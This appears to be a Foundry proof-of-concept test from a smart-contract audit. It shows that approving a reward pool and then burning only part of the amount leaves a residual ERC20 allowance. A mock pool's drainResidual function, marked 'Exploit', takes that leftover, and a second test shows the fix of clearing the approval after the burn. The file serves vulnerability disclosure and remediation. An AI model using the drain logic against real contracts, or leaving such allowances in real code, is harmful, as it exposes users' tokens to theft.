// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Simplified mock to demonstrate the residual approval issue
contract MockRewardToken is ERC20 {
    constructor() ERC20("dYFI", "dYFI") {
        _mint(msg.sender, 1_000_000e18);
    }
}

// Mock reward pool that intentionally pulls fewer tokens than approved
contract MockRewardPool {
    IERC20 public token;
    bool public partialPull;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function setPartialPull(bool _partial) external {
        partialPull = _partial;
    }

    function burn(uint256 amount) external returns (bool) {
        if (partialPull) {
            // Only pull half -- simulates a scenario where burn consumes less than approved
            token.transferFrom(msg.sender, address(this), amount / 2);
        } else {
            token.transferFrom(msg.sender, address(this), amount);
        }
        return true;
    }

    // Exploit: drain residual allowance
    function drainResidual(address gauge) external {
        uint256 allowance = token.allowance(gauge, address(this));
        if (allowance > 0) {
            token.transferFrom(gauge, address(this), allowance);
        }
    }
}

contract GaugeApprovalPoC is Test {
    MockRewardToken token;
    MockRewardPool pool;

    function setUp() public {
        token = new MockRewardToken();
        pool = new MockRewardPool(address(token));
    }

    // Demonstrates that approve + partial burn leaves residual allowance
    function test_ResidualApproval() public {
        uint256 penalty = 100e18;
        token.transfer(address(this), penalty);

        // Simulate Gauge._transferVeYfiORewards
        IERC20(address(token)).approve(address(pool), penalty);

        // Pool only pulls half (simulating partial failure)
        pool.setPartialPull(true);
        pool.burn(penalty);

        // Residual allowance remains!
        uint256 residual = token.allowance(address(this), address(pool));
        assertEq(residual, penalty / 2, "Residual allowance should be half");

        // Pool can drain the residual later
        pool.drainResidual(address(this));
        assertEq(token.balanceOf(address(this)), 0, "All tokens drained via residual");
    }

    // Demonstrates that approve(0) + approve(amount) pattern is safe
    function test_SafeApprovePattern() public {
        uint256 penalty = 100e18;
        token.transfer(address(this), penalty);

        // Safe pattern: approve(0) then approve(amount)
        IERC20(address(token)).approve(address(pool), 0);
        IERC20(address(token)).approve(address(pool), penalty);

        pool.setPartialPull(true);
        pool.burn(penalty);

        // Still has residual -- the fix should ALSO clear after burn
        uint256 residual = token.allowance(address(this), address(pool));
        assertTrue(residual > 0, "Still has residual without post-burn clear");

        // Full fix: clear after burn
        IERC20(address(token)).approve(address(pool), 0);
        residual = token.allowance(address(this), address(pool));
        assertEq(residual, 0, "Residual cleared after post-burn approve(0)");
    }
}
